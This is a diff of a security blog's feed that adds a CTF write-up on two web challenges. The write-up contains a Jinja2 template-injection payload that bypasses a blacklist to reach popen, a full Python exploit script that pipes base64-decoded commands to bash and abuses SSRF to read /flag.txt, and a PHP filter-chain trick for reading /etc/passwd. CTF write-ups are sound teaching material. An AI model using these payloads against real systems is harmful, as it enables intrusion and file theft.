@@ -12,15 +12,35 @@
     <![CDATA[Cybersecurity Research, Bug Bounty & Technical Writeups]]>
   </subtitle>
   <title>Tanknight</title>
-  <updated>2026-07-15T23:48:55.557Z</updated>
+  <updated>2026-07-16T00:52:40.271Z</updated>
   <entry>
     <author>
       <name>Tanknight</name>
     </author>
     <category term="writeups" scheme="http://tanknight.blog/categories/writeups/"/>
-    <category term="xss" scheme="http://tanknight.blog/tags/xss/"/>
+    <category term="ssrf" scheme="http://tanknight.blog/tags/ssrf/"/>
+    <category term="arbitrary-file-read" scheme="http://tanknight.blog/tags/arbitrary-file-read/"/>
+    <category term="ssti" scheme="http://tanknight.blog/tags/ssti/"/>
+    <content>
+      <![CDATA[<h1 id="MiniWeb"><a href="#MiniWeb" class="headerlink" title="MiniWeb"></a>MiniWeb</h1><p><img src="/../images/Hack-Today-CTF-2025-Writeup.png"></p><p>There are 2 applications:</p><ul><li>Front-server (accessible at port 5001)</li><li>Internal-server (only accessible locally)</li></ul><p><img src="/../images/Hack-Today-CTF-2025-Writeup-1.png"></p><p>This already indicates that we need to perform an SSRF to the internal-server.</p><p>At <a href="http://103.160.212.3:5001/sub">http://103.160.212.3:5001/sub</a>, there is an SSTI vulnerability, but the user input is sanitized first.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-2.png"></p><p>Yeah, this is their sanitation function that we have to bypass—just read it yourself lol.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-3.png"></p><p>Let’s just list all the available classes. We want to access the <code>os._wrap_close</code> class, but the problem is we can’t use <code>[&lt;index&gt;]</code> because <code>[]</code> is blacklisted.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-4.png"></p><p>The way to bypass it is:</p><pre><code class="language-python">{{'abcdef'|slice(2)|first}} ⇒ ['a', 'b', 'c']{{'abcdef'|slice(2)|reverse|first}} ⇒ ['d', 'e', 'f']{{'abcdef'|slice(2)|first|slice(2)|first}} ⇒ ['a', 'b']{{'abcdef'|slice(2)|first|slice(2)|reverse|first}} ⇒ ['c']</code></pre><p>Yeah.. basically, we’re going to keep using slice, reverse, and first until we get the <code>os.wrap_close</code> class.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-5.png"></p><p>We access the os <code>init</code> globals, and our goal is to get <code>popen</code>. The problem is <code>.__init__.__globals__.popen</code> won’t work because <code>popen</code> is blacklisted, so the way to bypass it is by using <code>|attr('get')('po'~'pen')</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-6.png"><br><img src="/../images/Hack-Today-CTF-2025-Writeup-7.png"></p><p>Nice, got RCE!<br><img src="/../images/Hack-Today-CTF-2025-Writeup-8.png"></p><p>Next, we want to SSRF into the internal service, but <code>curl</code> isn’t available. Fortunately, the <code>requests</code> library is installed in their <code>requirements.txt</code>, so we can do the SSRF using the <code>requests</code> library.</p><p>If we look at the internal service, the flag is located in the root directory (<code>/flag.txt</code>), so we most likely need to achieve an arbitrary file read.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-9.png"></p><p>The endpoint <a href="http://internal-server:9000/">http://internal-server:9000/</a> accepts a <code>url</code> parameter, which will be fetched via <code>curl</code>. However, the protocol of this URL will be checked.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-10.png"></p><p>If the URL is <code>file:///flag.txt</code> ⇒ it gets blacklisted. The bypass here is using <code>filE:///flag.txt</code>—when parsed, the protocol becomes <code>filE</code> 😀 (it’s case-sensitive, bro…).</p><pre><code class="language-python">import requestsimport base64URL = "[http://103.160.212.3:5001](http://103.160.212.3:5001)"  python_code = '''import requests; res = requests.get('http://internal-server:9000/?url=filE:///flag.txt'); print(res.text)'''python = base64.b64encode(f"""python3 -c "{python_code}" """.encode()).decode()payload = f"""{{{{(''.__class__.__base__.__subclasses__()|slice(2)|first|reverse|slice(2)|first|reverse|slice(33)|first|reverse|slice(4)|first|first).__init__|attr('__glo'~'bals__')|attr('get')('po'~'pen')('''echo {python} | base64 -d | bash''')|attr('re'~'ad')()}}}}"""  res = requests.get(URL + "/sub", params={'name':payload})print(res.text)</code></pre><p><img src="/../images/Hack-Today-CTF-2025-Writeup-11.png"></p><h1 id="MDParser"><a href="#MDParser" class="headerlink" title="MDParser"></a>MDParser</h1><p><img src="/../images/Hack-Today-CTF-2025-Writeup-12.png"></p><p>We are given 1 app. If we check the Dockerfile, the flag is located at <code>/home/&lt;random-user&gt;/flag.txt</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-13.png"></p><p>We most likely need to get an arbitrary read. The <code>/etc/passwd</code> file will leak that random username. Then we can read the flag at <code>/home/&lt;random-user&gt;/flag.txt</code>.</p><p>When we input <code>![test](http://evil.com)</code> into the markdown parser, it turns into this:<br><img src="/../images/Hack-Today-CTF-2025-Writeup-14.png"></p><p>If the URL points to a valid image, the rendered result looks like this, with the image encoded in base64:<br><img src="/../images/Hack-Today-CTF-2025-Writeup-15.png"></p><p>By looking at the <code>imageSourceFromPath</code> function, we can see that if the retrieved data is an image, it will display its content.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-16.png"></p><p>Now, let’s say <code>file:///test.txt</code> contains the header “GIF89a; [content here]”. The contents of <code>test.txt</code> will be revealed. Why? Because <code>finfo_buffer</code> predicts the mime type just by looking at the beginning of the file (basically, it’s just looking for the magic header).</p><p><img src="/../images/Hack-Today-CTF-2025-Writeup-18.png"></p><p>So, how do we prepend <code>GIF89a</code> to the contents of the <code>/etc/passwd</code> file?</p><p>Well, there’s something called a PHP filter chain (<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a>).</p><p><img src="/../images/Hack-Today-CTF-2025-Writeup-19.png"></p><p>Basically, it generates a PHP filter that can construct a specific string, like <code>GIF89a</code>.</p><p>So when we curl using that link, the prefix will be <code>GIF89a</code> (followed by some junk data).<br><img src="/../images/Hack-Today-CTF-2025-Writeup-20.png"></p><p>Now, we change <code>resource=php://temp</code> to <code>resource=/etc/passwd</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-21.png"></p><p>Now it becomes <code>GIF89a</code> + junk + the content of <code>/etc/passwd</code>. <code>finfo_buffer()</code> still detects this as <code>image/gif</code> 😀 (since it starts with <code>GIF89a</code>).</p><p>And just like that, we got the username…<br><img src="/../images/Hack-Today-CTF-2025-Writeup-22.png"></p><p>Now we just need to read <code>/home/userfbszb7za/flag.txt</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-23.png"></p>]]>
+    </content>
+    <id>http://tanknight.blog/2026/07/16/Hack-Today-CTF-2025-Writeup/</id>
+    <link href="http://tanknight.blog/2026/07/16/Hack-Today-CTF-2025-Writeup/"/>
+    <published>2026-07-16T00:37:35.000Z</published>
+    <summary>
+      <![CDATA[<h1 id="MiniWeb"><a href="#MiniWeb" class="headerlink" title="MiniWeb"></a>MiniWeb</h1><p><img src="/../images/Hack-Today-CTF-2025-Writeup.p]]>
+    </summary>
+    <title>Hack Today CTF 2025 Writeup</title>
+    <updated>2026-07-16T00:52:40.271Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Tanknight</name>
+    </author>
+    <category term="writeups" scheme="http://tanknight.blog/categories/writeups/"/>
     <category term="css-injection" scheme="http://tanknight.blog/tags/css-injection/"/>
     <category term="idor" scheme="http://tanknight.blog/tags/idor/"/>
+    <category term="xss" scheme="http://tanknight.blog/tags/xss/"/>
     <category term="csp-bypass" scheme="http://tanknight.blog/tags/csp-bypass/"/>
     <category term="prototype-pollution" scheme="http://tanknight.blog/tags/prototype-pollution/"/>
     <category term="iframe-sandbox-bypass" scheme="http://tanknight.blog/tags/iframe-sandbox-bypass/"/>
@@ -73,8 +93,8 @@
       <![CDATA[<p>I’m just writing this blog post about the most interesting web challenges I solved.</p>
 <h1 id="Sandbox"><a href="#Sandbox" class="header]]>
     </summary>
-    <title>SCHEMATICS CTF 2025 Writeup</title>
-    <updated>2026-07-14T15:44:01.851Z</updated>
+    <title>Schematics CTF 2025 Writeup</title>
+    <updated>2026-07-16T00:37:10.698Z</updated>
   </entry>
   <entry>
     <author>
@@ -130,7 +150,7 @@
       <![CDATA[<h1 id="ShareIT"><a href="#ShareIT" class="headerlink" title="ShareIT"></a>ShareIT</h1><h2 id="Step-1-Where-is-the-Flag"><a href="#Step-1-Wh]]>
     </summary>
     <title>ACE CTF 2025 Writeup</title>
-    <updated>2026-07-13T20:17:13.135Z</updated>
+    <updated>2026-07-16T00:37:23.678Z</updated>
   </entry>
   <entry>
     <author>
@@ -138,9 +158,9 @@
     </author>
     <category term="writeups" scheme="http://tanknight.blog/categories/writeups/"/>
     <category term="ssrf" scheme="http://tanknight.blog/tags/ssrf/"/>
+    <category term="ssti" scheme="http://tanknight.blog/tags/ssti/"/>
     <category term="mass-assignment" scheme="http://tanknight.blog/tags/mass-assignment/"/>
     <category term="nginx-misconfig" scheme="http://tanknight.blog/tags/nginx-misconfig/"/>
-    <category term="ssti" scheme="http://tanknight.blog/tags/ssti/"/>
     <category term="command-injection" scheme="http://tanknight.blog/tags/command-injection/"/>
     <category term="parser-discrepancies" scheme="http://tanknight.blog/tags/parser-discrepancies/"/>
     <category term="path-traversal" scheme="http://tanknight.blog/tags/path-traversal/"/>
@@ -154,6 +174,6 @@
       <![CDATA[<h1 id="Qualification"><a href="#Qualification" class="headerlink" title="Qualification"></a>Qualification</h1><h2 id="Web-V1"><a href="#Web]]>
     </summary>
     <title>IFEST CTF 2025 Writeup</title>
-    <updated>2026-07-13T20:17:08.931Z</updated>
+    <updated>2026-07-16T00:37:17.802Z</updated>
   </entry>
 </feed>
